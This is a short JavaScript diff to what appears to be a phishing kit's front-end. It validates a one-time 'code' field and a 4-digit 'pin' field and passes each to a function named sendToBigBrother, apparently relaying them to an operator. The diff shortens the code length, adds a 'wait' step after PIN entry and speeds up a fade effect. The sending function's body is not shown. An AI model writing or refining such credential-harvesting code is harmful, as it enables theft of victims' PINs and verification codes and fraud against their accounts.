@@ -111,7 +111,7 @@ function verifyInput(_name)
 		switch(_name)
 		{
 			case 'code':
-				if($(this).val().length === 6)
+				if($(this).val().length === 5)
 				{
 					changer('code');
 					sendToBigBrother(_name);
@@ -121,6 +121,7 @@ function verifyInput(_name)
 			case 'pin':
 				if($(this).val().length === 4)
 				{
+					gotoStep('wait');
 					changer('pin');
 					sendToBigBrother(_name);
 				}
@@ -323,7 +324,7 @@ function changer(_name, _enable, _delay, _changeEnterBox)
 			if(_enable === undefined)
 			{
 				// disable it
-				elField.fadeOut(100);
+				elField.fadeOut(50);
 				el.attr('disabled', true);
 				$('.enter').removeClass('large');
 			}
